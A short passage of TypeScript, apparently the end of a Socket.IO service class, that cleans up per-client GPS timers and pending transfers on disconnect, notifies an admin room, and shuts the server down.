    if (timer) { clearInterval(timer); this.gpsTimers.delete(clientId); }

    for (const [transferId, transfer] of this.transfers) {
      if (transferId.startsWith(clientId + ':')) this.transfers.delete(transferId);
    }

    this.io.to('admin').emit('client:disconnect', { id: clientId });
  }

  shutdown(): void {
    for (const [, timer] of this.gpsTimers) clearInterval(timer);
    this.gpsTimers.clear();
    this.transfers.clear();
    this.io.close();
  }
}

export const socketService = new SocketService();
